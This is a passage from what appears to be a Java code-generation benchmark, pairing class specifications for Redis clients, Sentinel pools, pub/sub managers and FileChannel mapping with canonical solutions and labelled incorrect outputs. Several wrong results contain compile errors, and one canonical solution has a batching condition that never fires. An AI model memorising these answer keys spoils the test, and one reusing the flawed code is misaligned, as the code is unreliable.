    "wrong_result": "RedisInteraction.java\nRedisClient redisClient;\nStatefulRedisConnection<String, String> connection;\nRedisCommands<String, String> syncCommands;\n\nRedisInteraction(String redisUri) {\n    redisClient = RedisClient.create(redisUri);\n    connection = redisClient.connect();\n    syncCommands = connection.sync();\n}\n\nvoid setValue(String key, String value) {\n    syncCommands.set(key, value);\n}\n\nString getValue(String key) {\n    return syncCommands.get(key).orElse(null);\n}\n\nvoid closeConnection() {\n    if (connection != null) {\n        connection.close();\n    }\n    if (redisClient != null) {\n        redisClient.shutdown();\n    }\n}"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Java class that utilizes Java NIO's FileChannel to map a file into memory for read-only access, providing methods to access the mapped memory address and file size, and properly closing the channel when done.\n\nClass Description: The FileChannelProcessor class provides functionality to open a file using FileChannel, map it into memory in read-only mode, and expose the memory address and file size. It ensures proper resource cleanup by implementing a close method.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedAddress: long - The memory address where the file is mapped\nfileSize: long - The size of the mapped file in bytes\n\nMethods:\nFileChannelProcessor: [Constructor](String filePath) throws IOException - Initializes the FileChannel, maps the file into memory in read-only mode, and stores the memory address and file size\ngetMappedAddress: () -> long - Returns the memory address where the file is mapped\ngetFileSize: () -> long - Returns the size of the mapped file\nclose: () throws IOException - Closes the FileChannel to release system resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mappedAddress = fileChannel.map(MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.READ);\n        this.mappedAddress = this.fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, this.fileChannel.size()).address();\n        this.fileSize = this.fileChannel.size();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Implement a Java class for interacting with Redis using the Lettuce client, including connection management and data operations.\n\nClass Description: The RedisInteraction class provides functionality to establish and manage a connection to a Redis server, perform bulk data operations, and clean up resources. It uses the Lettuce client library for Redis interactions.\n\nAttributes:\n- client: RedisClient - The Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active connection to the Redis server\n\nMethods:\n- initializeConnection() -> void - Initializes the Redis client and establishes a connection to the Redis server. Also clears all existing data in Redis.\n- closeConnection() -> void - Closes the Redis connection and shuts down the client to release resources.\n- createRedisPublisher(long elements) -> Publisher<String> - Creates and returns a Publisher that streams Redis keys. Populates Redis with test data (number of elements specified by input parameter) before creating the publisher. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.ScanStream;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RedisInteraction {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public void closeConnection() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n        sync.flushall();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        Map<String, String> map = new HashMap<>();\n        for (int i = 0; i < elements; i++) {\n            String element = \"RedisInteraction-\" + i;\n            map.put(element, element);\n\n            if (i % 1000 - 2020 == 0 && !map.isEmpty()) {\n                sync.mset(map);\n                map.clear();\n            }\n        }\n\n        if (!map.isEmpty()) {\n            sync.mset(map);\n            map.clear();\n        }\n\n        return ScanStream.scan(connection.reactive());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisInteraction {\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> redisCommands;\n\n    public void initializeConnection() {\n        client = RedisClient.create(\"redis://localhost:6379\");\n        connection = client.connect();\n        redisCommands = connection.sync();\n        List<String> keys = redisCommands.keys(\"*\");\n        for (String key : keys) {\n            redisCommands.del(key);\n        }\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        client.shutdown();\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n        for (long i = 0; i < elements; i++) {\n            String key = \"key:\" + i;\n            String value = \"value:\" + i;\n            redisCommands.set(key, value);\n        }\n        List<String> keys = redisCommands.keys(\"*\");\n        return Flux.fromIterable(keys);\n    }\n}"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = \"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class MultiClusterPooledConnectionProvider {\n    private final Logger log;\n    private final Map<Integer, Cluster> multiClusterMap;\n    private volatile int activeMultiClusterIndex;\n    private final Lock activeClusterIndexLock;\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null) {\n            throw new JedisValidationException(\"MultiClusterClientConfig cannot be null\");\n        }\n        this.log = multiClusterClientConfig.getLogger();\n        this.multiClusterMap = new ConcurrentHashMap<>();\n        this.activeClusterIndexLock = new ReentrantLock();\n        this.lastClusterCircuitBreakerForcedOpen = false;\n\n        // Initialize clusters based on configuration\n        for (int i = 0; i < multiClusterClientConfig.getClusters().size(); i++) {\n            Cluster cluster = new Cluster();\n            cluster.connectionPool = new JedisPool(\n                new JedisPoolConfig(),\n                multiClusterClientConfig.getClusters().get(i).getHost(),\n                multiClusterClientConfig.getClusters().get(i).getPort()\n            );\n            multiClusterMap.put(i, cluster);\n        }\n        this.activeMultiClusterIndex = 0; // Default to first cluster\n    }\n\n    public Connection getConnection() {\n        int clusterIndex = getActiveClusterIndex();\n        return getClusterConnection(clusterIndex);\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        if (multiClusterIndex < 0 || multiClusterIndex >= multiClusterMap.size()) {\n            throw new IndexOutOfBoundsException(\"Invalid cluster index\");\n        }\n        return getClusterConnection(multiClusterIndex);\n    }\n\n    private Connection getClusterConnection(int clusterIndex) {\n        Cluster cluster = multiClusterMap.get(clusterIndex);\n        if (cluster == null) {\n            throw new IllegalStateException(\"Cluster not found for index: \" + clusterIndex);\n        }\n        return cluster.getConnection();\n    }\n\n    public void close() {\n        int clusterIndex = getActiveClusterIndex();\n        Cluster cluster = multiClusterMap.get(clusterIndex);\n        if (cluster != null) {\n            cluster.connectionPool.close();\n        }\n    }\n\n    private int getActiveClusterIndex() {\n        activeClusterIndexLock.lock();\n        try {\n            // Implement failover logic here if needed\n            return activeMultiClusterIndex;\n        } finally {\n            activeClusterIndexLock.unlock();\n        }\n    }\n\n    public static class Cluster {\n        private ConnectionPool connectionPool;\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Java class that provides a wrapper for JedisSentinelPool to simplify Redis Sentinel connection management in Java applications.\n\nClass Description: JedisSentinelPoolWrapper is a utility class that encapsulates the functionality of JedisSentinelPool, providing methods for pool initialization, resource acquisition, and connection cleanup. It handles Redis Sentinel connections with configurable pool settings and client configurations.\n\nAttributes:\n- masterName: String - The name of the Redis master node in the Sentinel configuration\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- poolConfig: GenericObjectPoolConfig<Jedis> - Configuration for the connection pool\n- masterConfig: JedisClientConfig - Configuration for connections to the master node\n- sentinelConfig: JedisClientConfig - Configuration for connections to Sentinel nodes\n- pool: JedisSentinelPool - The underlying Jedis Sentinel connection pool instance\n\nMethods:\n- initializePool(): void - Initializes the JedisSentinelPool with the configured parameters\n- getResource(): Jedis - Retrieves a Jedis resource from the pool (throws JedisConnectionException if pool not initialized)\n- close(): void - Closes the pool if it's open\n- isClosed(): boolean - Returns whether the pool is closed\n- destroy(): void - Destroys the pool and all its resources\n- toStrings(Set<HostAndPort>): Set<String> - Static helper method to convert HostAndPort objects to strings",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPoolWrapper {\n\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels,\n                                  GenericObjectPoolConfig<Jedis> poolConfig,\n                                  JedisClientConfig masterConfig,\n                                  JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        this.pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n    }\n\n    public Jedis getResource() throws JedisConnectionException {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && !pool.isClosed()) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    private static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream().map(HostAndPort::toString).collect(Collectors.toSet());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisSentinelPoolWrapper {\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels, GenericObjectPoolConfig<Jedis> poolConfig, JedisClientConfig masterConfig, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        this.pool = new JedisSentinelPool(masterName, sentinels, sentinelConfig);\n    }\n\n    public Jedis getResource() {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool != null && pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    public static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        Set<String> result = new HashSet<>();\n        for (HostAndPort hostAndPort : hostAndPorts) {\n            result.add(hostAndPort.toString());\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Java class that implements a Redis Sentinel connection pool for managing connections to a Redis master server, with automatic failover handling when the master changes.\n\nClass Description: JedisSentinelPool is a connection pool implementation that maintains connections to a Redis master server discovered through Redis Sentinel. It automatically handles master failover by monitoring Sentinel notifications and reconfiguring the connection pool when the master changes.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- factory: JedisFactory - Factory for creating Jedis instances\n- sentinelClientConfig: JedisClientConfig - Configuration for connecting to Sentinels\n- masterListeners: Collection<MasterListener> - Collection of threads monitoring Sentinel servers\n- currentHostMaster: HostAndPort - Current master server address (volatile)\n- initPoolLock: Lock - Lock for thread-safe pool initialization\n\nMethods:\n- JedisSentinelPool(String, Set<HostAndPort>, JedisFactory, JedisClientConfig) -> void - Constructor that initializes the Sentinel pool with master name, Sentinel addresses, factory, and client config\n- initMaster(HostAndPort) -> void - Initializes or updates the master connection pool\n- initSentinels(Set<HostAndPort>, String) -> HostAndPort - Discovers the current master from Sentinels and starts listeners\n- toHostAndPort(List<String>) -> HostAndPort - Converts Sentinel response to HostAndPort object\n- getResource() -> Jedis - Gets a Jedis resource from the pool (overrides parent method)\n- returnResource(Jedis) -> void - Returns a Jedis resource to the pool (overrides parent method)\n\nNested Class MasterListener:\n- masterName: String - Name of the monitored master\n- host: String - Sentinel host address\n- port: int - Sentinel port number\n- subscribeRetryWaitTimeMillis: long - Retry wait time for subscription\n- j: Jedis - Jedis instance for Sentinel connection\n- running: AtomicBoolean - Flag controlling listener thread\n\nMasterListener Methods:\n- MasterListener(String, String, int) -> void - Constructor for Sentinel listener\n- run() -> void - Main listener thread that monitors Sentinel for master changes\n- shutdown() -> void - Gracefully shuts down the listener thread",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n\n  private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n  private final JedisFactory factory;\n  private final JedisClientConfig sentinelClientConfig;\n  protected final Collection<MasterListener> masterListeners = new ArrayList<>();\n  private volatile HostAndPort currentHostMaster;\n  private final Lock initPoolLock = new ReentrantLock(true);\n\n  public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels,\n      final JedisFactory factory, final JedisClientConfig sentinelClientConfig) {\n    super(factory);\n    this.factory = factory;\n    this.sentinelClientConfig = sentinelClientConfig;\n    HostAndPort master = initSentinels(sentinels, masterName);\n    initMaster(master);\n  }\n\n  private void initMaster(HostAndPort master) {\n    initPoolLock.lock();\n    try {\n      if (!master.equals(currentHostMaster)) {\n        currentHostMaster = master;\n        factory.setHostAndPort(currentHostMaster);\n        super.clear();\n        LOG.info(\"Created JedisSentinelPool to master at {}\", master);\n      }\n    } finally {\n      initPoolLock.unlock();\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels, final String masterName) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n    LOG.info(\"Trying to find master from available Sentinels...\");\n\n    for (HostAndPort sentinel : sentinels) {\n      LOG.debug(\"Connecting to Sentinel {}\", sentinel);\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n        if (masterAddr == null || masterAddr.size() != 2) {\n          LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}\", masterName, sentinel);\n          continue;\n        }\n        master = toHostAndPort(masterAddr);\n        LOG.debug(\"Found Redis master at {}\", master);\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Cannot get master address from sentinel running @ {}. Reason: {}. Trying next one.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored...\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where is \" + masterName + \" master is running...\");\n      }\n    }\n\n    LOG.info(\"Redis master running at {}, starting Sentinel listeners...\", master);\n    for (HostAndPort sentinel : sentinels) {\n      MasterListener masterListener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n      masterListener.setDaemon(true);\n      masterListeners.add(masterListener);\n      masterListener.start();\n    }\n    return master;\n  }\n\n  private HostAndPort toHostAndPort(List<String> getMasterAddrByNameResult) {\n    String host = getMasterAddrByNameResult.get(0);\n    int port = Integer.parseInt(getMasterAddrByNameResult.get(1));\n    return new HostAndPort(host, port);\n  }\n\n  @Override\n  public Jedis getResource() {\n    while (true) {\n      Jedis jedis = super.getResource();\n      jedis.setDataSource(this);\n      final HostAndPort master = currentHostMaster;\n      final HostAndPort connection = jedis.getClient().getHostAndPort();\n      if (master.equals(connection)) {\n        return jedis;\n      } else {\n        returnBrokenResource(jedis);\n      }\n    }\n  }\n\n  @Override\n  public void returnResource(final Jedis resource) {\n    if (resource != null) {\n      try {\n        resource.resetState();\n        super.returnResource(resource);\n      } catch (RuntimeException e) {\n        returnBrokenResource(resource);\n        LOG.debug(\"Resource is returned to the pool as broken\", e);\n      }\n    }\n  }\n\n  protected class MasterListener extends Thread {\n    protected String masterName;\n    protected String host;\n    protected int port;\n    protected long subscribeRetryWaitTimeMillis = 5000;\n    protected volatile Jedis j;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public MasterListener(String masterName, String host, int port) {\n      super(String.format(\"MasterListener-%s-[%s:%d]\", masterName, host, port));\n      this.masterName = masterName;\n      this.host = host;\n      this.port = port;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n      while (running.get()) {\n        try {\n          if (!running.get()) break;\n          final HostAndPort hostPort = new HostAndPort(host, port);\n          j = new Jedis(hostPort, sentinelClientConfig);\n          List<String> masterAddr = j.sentinelGetMasterAddrByName(masterName);\n          if (masterAddr == null || masterAddr.size() != 2) {\n            LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}.\", masterName, hostPort);\n          } else {\n            initMaster(toHostAndPort(masterAddr));\n          }\n          j.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              LOG.debug(\"Sentinel {} published: {}.\", hostPort, message);\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3) {\n                if (masterName.equals(switchMasterMsg[0])) {\n                  initMaster(toHostAndPort(Arrays.asList(switchMasterMsg[3], switchMasterMsg[4])));\n                } else {\n                  LOG.debug(\"Ignoring message on +switch-master for master name {}, our master name is {}\",\n                      switchMasterMsg[0], masterName);\n                }\n              } else {\n                LOG.error(\"Invalid message received on Sentinel {} on channel +switch-master: {}\",\n                    hostPort, message);\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            LOG.error(\"Lost connection to Sentinel at {}:{}. Sleeping 5000ms and retrying.\", host, port, e);\n            try {\n              Thread.sleep(subscribeRetryWaitTimeMillis);\n            } catch (InterruptedException e1) {\n              LOG.error(\"Sleep interrupted: \", e1);\n            }\n          } else {\n            LOG.debug(\"Unsubscribing from Sentinel at {}:{}\", host, port);\n          }\n        } finally {\n          if (j != null) {\n            j.close();\n          }\n        }\n      }\n    }\n\n    public void shutdown() {\n      try {\n        LOG.debug(\"Shutting down listener on {}:{}\", host, port);\n        running.set(false);\n        if (j != null) {\n          j.close();\n        }\n      } catch (RuntimeException e) {\n        LOG.error(\"Caught exception while shutting down: \", e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisSentinelPool {\n    private final Logger LOG;\n    private final JedisFactory factory;\n    private final JedisClientConfig sentinelClientConfig;\n    private final Collection<MasterListener> masterListeners = new ArrayList<>();\n    private volatile HostAndPort currentHostMaster;\n    private final Lock initPoolLock = new ReentrantLock();\n\n    public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels, JedisFactory factory, JedisClientConfig sentinelClientConfig) {\n        this.LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n        this.factory = factory;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.currentHostMaster = initSentinels(sentinels, masterName);\n    }\n\n    private void initMaster(HostAndPort newMaster) {\n        initPoolLock.lock();\n        try {\n            if (currentHostMaster == null || !currentHostMaster.equals(newMaster)) {\n                currentHostMaster = newMaster;\n                // Reconfigure connection pool with new master\n            }\n        } finally {\n            initPoolLock.unlock();\n        }\n    }\n\n    private HostAndPort initSentinels(Set<HostAndPort> sentinels, String masterName) {\n        HostAndPort currentMaster = null;\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = factory.create(sentinel, sentinelClientConfig)) {\n                String masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n                if (masterAddr != null) {\n                    currentMaster = toHostAndPort(masterAddr.split(\":\"));\n                    break;\n                }\n            } catch (Exception e) {\n                LOG.warn(\"Failed to get master address from Sentinel {}\", sentinel, e);\n            }\n        }\n        if (currentMaster != null) {\n            for (HostAndPort sentinel : sentinels) {\n                masterListeners.add(new MasterListener(masterName, sentinel.getHost(), sentinel.getPort()));\n            }\n        }\n        return currentMaster;\n    }\n\n    private HostAndPort toHostAndPort(List<String> parts) {\n        return new HostAndPort(parts.get(0), Integer.parseInt(parts.get(1)));\n    }\n\n    @Override\n    public Jedis getResource() {\n        // Implementation to get Jedis from pool using currentHostMaster\n        return null;\n    }\n\n    @Override\n    public void returnResource(Jedis resource) {\n        // Implementation to return Jedis to pool\n    }\n\n    static class MasterListener implements Runnable {\n        private final String masterName;\n        private final String host;\n        private final int port;\n        private final long subscribeRetryWaitTimeMillis = 5000;\n        private Jedis j;\n        private final AtomicBoolean running = new AtomicBoolean(true);\n\n        public MasterListener(String masterName, String host, int port) {\n            this.masterName = masterName;\n            this.host = host;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            while (running.get()) {\n                try {\n                    j = factory.create(new HostAndPort(host, port), sentinelClientConfig);\n                    j.subscribe(new JedisPubSub() {\n                        @Override\n                        public void onMessage(String channel, String message) {\n                            if (channel.equals(masterName)) {\n                                String[] parts = message.split(\",\");\n                                HostAndPort newMaster = toHostAndPort(Arrays.asList(parts[0], parts[1]));\n                                initMaster(newMaster);\n                            }\n                        }\n                    }, masterName);\n                } catch (Exception e) {\n                    LOG.warn(\"Failed to subscribe to Sentinel {}\", new HostAndPort(host, port), e);\n                    try {\n                        Thread.sleep(subscribeRetryWaitTimeMillis);\n                    } catch (InterruptedException ignored) {\n                    }\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n            if (j != null) {\n                j.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 334,
    "Instruction": "Task Description: Implement a Redis Pub/Sub manager class in Java that handles publishing and subscribing to Redis channels, including connection management and resource cleanup.\n\nClass Description: RedisPubSubManager is a class that manages Redis publish/subscribe operations using a connection pool. It provides methods to start subscribers and publishers on a specified channel, and handles connection lifecycle management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- channelName: String - The name of the channel to publish/subscribe to\n- logger: Logger - Logger instance for logging operations and errors\n\nMethods:\n- RedisPubSubManager(String host, int port, String channelName) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and channel name\n- startSubscriber(Subscriber subscriber) -> void - Starts a subscriber thread that listens to messages on the configured channel using the provided subscriber implementation\n- startPublisher() -> void - Starts a publisher that can send messages to the configured channel\n- shutdown() -> void - Closes the connection pool and releases all resources",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisPubSubManager {\n\n    private static final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n    private final JedisPool jedisPool;\n    private final String channelName;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 0);\n        this.channelName = channelName;\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        Jedis subscriberJedis = jedisPool.getResource();\n        new Thread(() -> {\n            try {\n                logger.info(\"Subscribing to \\\"\" + channelName + \"\\\". This thread will be blocked.\");\n                subscriberJedis.subscribe(subscriber, channelName);\n                logger.info(\"Subscription ended.\");\n            } catch (Exception e) {\n                logger.error(\"Subscribing failed.\", e);\n            } finally {\n                subscriberJedis.close();\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        Jedis publisherJedis = jedisPool.getResource();\n        new Publisher(publisherJedis, channelName).start();\n        publisherJedis.close();\n    }\n\n    public void shutdown() {\n        jedisPool.destroy();\n    }\n}",
    "Code_level": "Class-level",
